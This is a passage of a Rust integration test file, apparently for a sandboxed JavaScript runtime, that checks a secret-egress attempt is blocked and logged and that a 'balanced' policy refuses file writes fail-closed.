            .expect("non-exfiltration claim verifies: the secret was blocked before the sink");
    assert!(
        non_exfil
            .examined_effects
            .iter()
            .any(|e| e.effect_kind == "http_request" && e.proof_outcome == "blocked_before_sink"),
        "the SDK must classify the blocked secret egress as blocked_before_sink"
    );
    layer_pass(
        "L2.5 FLOW secret egress blocked + non-exfiltration proven",
        "flow_policy_verdict=blocked, SDK=blocked_before_sink",
    );

    // ---- L3 LOG: same ordered contract, exfil trace id; the denied
    // crossing surfaces as an FN-EFFECT-002 event too (denial is evidence).
    let events = structured_events(&run.stderr);
    assert_event_order(
        &events,
        &["RUN-001", "RUN-003", "FN-EFFECT-002", "RUN-004"],
        EXFIL_TRACE_ID,
    );
    let effect_events = events
        .iter()
        .filter(|(code, _)| code == "FN-EFFECT-002")
        .count();
    assert_eq!(
        effect_events as u64,
        ledger["effect_count"].as_u64().expect("effect_count"),
        "one FN-EFFECT-002 event per ledger entry (denied included)"
    );
    layer_pass(
        "L3 LOG ordered RUN-*/FN-EFFECT-002 events, single trace id",
        &format!("effect_events={effect_events}"),
    );

    // ---- L5 VSDK: the denial chain re-derives offline too.
    verifier_sdk_leg(&ledger);

    // ---- L4 REPLAY + L6 LTV over the denial evidence.
    let bundle_integrity_hash = incident_chain_leg(
        workspace.path(),
        "INC-TNR-EXFIL-0001",
        EXFIL_TRACE_ID,
        &ledger,
    );
    ltv_leg(&ledger, &bundle_integrity_hash, EXFIL_TRACE_ID);

    println!(
        "[TNR-E2E] ================ EXFIL VARIANT: CONTAINED + ALL LAYERS PASS (trace_id={EXFIL_TRACE_ID})"
    );
}

/// The third enforcement arm, pinned so the pipeline's profile choice stays
/// honest: under `balanced` the ENGINE capability gate itself refuses
/// `fs:write` before the effect happens — a hard interpreter abort (non-zero
/// exit, no bytes on disk), not a ledger-surfaced denial. This is the
/// capability-metering layer the bead's vision calls "capability-accounted
/// runtime kernel"; the pipeline tests above run under `legacy-risky`
/// precisely because it grants these capabilities, moving the enforcement
/// boundary to the SSRF gate where denials become signed ledger receipts.
#[test]
fn tnr_engine_capability_gate_fails_closed_under_balanced() {
    let app = "const fs = require('fs');\n\
               fs.writeFileSync('out.txt', 'must-never-land');\n";
    let workspace = bootstrap_workspace(app, "balanced");
    let run_output = Command::new(franken_node_bin())
        .current_dir(workspace.path())
        .args([
            "run",
            "app.js",
            "--policy",
            "balanced",
            "--runtime",
            "franken-engine",
            "--engine-bin",
            franken_node_bin(),
        ])
        .output()
        .expect("spawn franken-node run");

    assert!(
        !run_output.status.success(),
        "balanced must refuse the ungranted fs:write capability fail-closed"
    );
    let stderr = String::from_utf8_lossy(&run_output.stderr);
    assert!(
        stderr.contains("capability denied: fs:write"),
        "the refusal must name the denied capability, got:\n{stderr}"
    );
    assert!(
        !workspace.path().join("out.txt").exists(),
        "no bytes may land on disk after a capability refusal"
    );
    layer_pass(
        "L1 RUN engine capability gate (balanced)",
        "fs:write refused pre-effect, non-zero exit, no bytes on disk",
    );
}
